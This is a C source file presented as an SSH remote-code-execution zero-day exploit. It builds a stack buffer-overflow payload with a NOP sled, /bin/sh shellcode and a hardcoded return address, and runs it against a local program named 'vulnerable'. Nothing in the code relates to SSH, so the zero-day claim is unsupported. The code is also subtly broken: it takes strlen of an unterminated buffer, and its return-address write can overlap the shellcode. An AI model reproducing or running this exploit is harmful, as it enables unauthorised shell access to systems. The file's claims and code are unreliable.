/*
 * SSH Remote Code Execution Exploit (Zero-Day)
 * Created By: Taylor Christian Newsome
 *
 * Exploits a buffer overflow in a vulnerable SSH function.
 * Overwrites return address & injects shellcode for RCE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFFER_SIZE 28    // Vulnerable buffer size
#define OVERFLOW_SIZE 64  // Total overflow size (buffer + saved EIP + NOP sled + shellcode)
#define NOP 0x90          // No-op instruction for sled

/* Shellcode: Spawns /bin/sh */
char shellcode[] =
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";

int main(int argc, char *argv[]) {
    char *payload;
    unsigned long ret_addr = 0xbffffc10;  // Adjusted return address (GDB debugging required)

    /* Allocate memory for exploit payload */
    payload = (char *)malloc(OVERFLOW_SIZE);
    if (!payload) {
        perror("malloc failed");
        exit(EXIT_FAILURE);
    }

    /* Fill buffer with NOP sled */
    memset(payload, NOP, OVERFLOW_SIZE);

    /* Inject shellcode at the end */
    memcpy(payload + (OVERFLOW_SIZE - strlen(shellcode) - 8), shellcode, strlen(shellcode));

    /* Overwrite return address */
    unsigned long *ptr = (unsigned long *)(payload + BUFFER_SIZE);
    *ptr = ret_addr;  // Inject controlled return address

    /* Print payload for manual testing */
    printf("[+] Payload created: %ld bytes\n", strlen(payload));

    /* Execute vulnerable program with exploit payload */
    char command[128];
    snprintf(command, sizeof(command), "./vulnerable \"%s\"", payload);
    system(command);

    /* Cleanup */
    free(payload);
    return 0;
}
